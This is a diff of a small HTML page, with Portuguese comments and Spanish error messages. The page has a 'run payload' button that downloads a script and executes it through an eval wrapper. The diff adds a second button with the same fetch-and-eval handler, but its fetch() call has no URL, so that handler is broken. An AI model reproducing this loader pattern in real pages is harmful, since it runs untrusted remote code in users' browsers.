@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="es-ES">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -28,6 +28,7 @@
     
     <!-- Botão para executar o payload -->
     <button id="executePayload">Executar Payload</button>
+    <button id="executePayloadtest2">Executar Payload test2</button>
 
     <script>
         function foo(a, b, c) {
@@ -86,6 +87,13 @@
                 .then(script => unsafeEval(script)) // Executa o payload usando eval
                 .catch(error => console.error('Error al cargar la carga útil: ' + error));
         });
+
+        document.getElementById("executePayloadtest2").addEventListener("click", function() {
+            fetch()
+                .then(response => response.text())
+                .then(script => unsafeEval(script)) // Executa o payload usando eval
+                .catch(error => console.error('Error al cargar la carga útil: ' + error));
+        }); 
     </script>
 </body>
 </html>
